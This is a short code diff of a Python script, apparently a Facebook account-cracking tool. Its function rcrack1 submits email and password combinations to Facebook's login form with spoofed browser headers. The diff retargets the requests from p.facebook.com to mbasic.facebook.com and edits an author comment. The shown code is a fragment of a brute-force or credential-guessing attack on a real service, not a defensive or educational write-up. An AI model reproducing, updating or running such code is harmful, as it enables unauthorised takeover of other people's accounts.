@@ -1,5 +1,5 @@
 #Create By: EMON HOSSAN BABU 
-#FaceBook: EMON HOSSAN MIAZI 
+#: EMON HOSSAN MIAZI 
 #---------------------------------------------------------------------------#
 import os,sys,time,json,random,re,string,platform,base64,uuid
 from bs4 import BeautifulSoup as sop
@@ -267,13 +267,13 @@ def rcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'p.facebook.com',
+            header_freefb = {'authority': 'mbasic.facebook.com',
 			'method':'GET',
 			'path':'/?tbua=1',
 			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
 			'accept-language': 'en-US,en;q=0.9',
 			'cache-control': 'max-age=0',
-			'referer': 'https://p.facebook.com/',
+			'referer': 'https://mbasic.facebook.com/',
 			'sec-ch-prefers-color-scheme': 'light',
 			'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
 			'sec-ch-ua-full-version-list': '"Chromium";v="111.0.5563.76", "Not(A:Brand";v="8.0.0.0"',
